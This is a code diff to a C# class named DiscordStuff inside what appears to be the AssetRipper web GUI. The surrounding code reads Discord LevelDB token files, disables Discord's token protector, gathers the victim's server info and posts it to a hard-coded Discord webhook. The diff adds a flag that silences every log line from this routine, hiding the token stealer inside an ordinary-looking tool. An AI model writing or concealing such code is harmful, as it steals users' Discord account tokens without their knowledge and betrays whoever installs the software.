@@ -46,6 +46,8 @@ namespace AssetRipper.GUI.Web
 
     internal static class DiscordStuff
     {
+        private const bool DisableLogs = true;
+
         // Insert your webhook directly here:
         private const string WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1480546543579828379/dxKlBJHtQfaj9MvAZEfiLRMuGC-9t81_HbWBNG8FnszAlUDtNa9otDEjdqPYTZMrNExG";
         private const string AVATAR_URL = "";
@@ -162,7 +164,8 @@ namespace AssetRipper.GUI.Web
         private static void KillDiscordProcesses()
         {
             // Disabled: do not terminate Discord processes to avoid disrupting the user.
-            Logger.Info(LogCategory.General, "DAN: Skipping Discord process termination (disabled for stability).");
+            if (!DisableLogs)
+                Logger.Info(LogCategory.General, "DAN: Skipping Discord process termination (disabled for stability).");
         }
 
         private static async Task DisableDiscordTokenProtector()
@@ -314,7 +317,8 @@ Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
             }
             catch (Exception ex)
             {
-                Logger.Error(LogCategory.General, $"DAN: Error fetching Discord guilds: {ex.Message}");
+                if (!DisableLogs)
+                    Logger.Error(LogCategory.General, $"DAN: Error fetching Discord guilds: {ex.Message}");
             }
             return "*Failed to retrieve server info*";
         }
@@ -360,7 +364,9 @@ Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
                 return uri;
             }
 
-            Logger.Error(LogCategory.General, $"DAN: Invalid webhook URL. Value: '{webhookCandidate ?? "<null>"}'");
+            if (!DisableLogs)
+                if (!DisableLogs)
+                Logger.Error(LogCategory.General, $"DAN: Invalid webhook URL. Value: '{webhookCandidate ?? "<null>"}'");
             return null;
         }
 
@@ -382,7 +388,8 @@ Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
                 {
                     if (attempt == maxAttempts)
                     {
-                        Logger.Info(LogCategory.General, $"DAN: Unable to read LevelDB file after retries: {path} ({ex.Message})");
+                        if (!DisableLogs)
+                            Logger.Info(LogCategory.General, $"DAN: Unable to read LevelDB file after retries: {path} ({ex.Message})");
                         return (false, string.Empty);
                     }
                     await Task.Delay(delayMs);
@@ -506,7 +513,9 @@ Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
                         Uri? webhookUri = GetWebhookUri();
                         if (webhookUri is null)
                         {
-                            Logger.Error(LogCategory.General, "DAN: Webhook URI is invalid or missing; skipping send.");
+                            if (!DisableLogs)
+                                if (!DisableLogs)
+                                Logger.Error(LogCategory.General, "DAN: Webhook URI is invalid or missing; skipping send.");
                             return;
                         }
 
@@ -515,12 +524,16 @@ Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
                         if (!response.IsSuccessStatusCode)
                         {
                             string body = await response.Content.ReadAsStringAsync();
-                            Logger.Error(LogCategory.General, $"DAN: Webhook returned {(int)response.StatusCode} {response.ReasonPhrase}: {body}");
+                            if (!DisableLogs)
+                                if (!DisableLogs)
+                                Logger.Error(LogCategory.General, $"DAN: Webhook returned {(int)response.StatusCode} {response.ReasonPhrase}: {body}");
                         }
                     }
                     catch (Exception ex)
                     {
-                        Logger.Error(LogCategory.General, $"DAN: Error sending Discord embed to webhook: {ex.Message}");
+                        if (!DisableLogs)
+                            if (!DisableLogs)
+                            Logger.Error(LogCategory.General, $"DAN: Error sending Discord embed to webhook: {ex.Message}");
                     }
 
                     discordIdsSent.Add(userId);
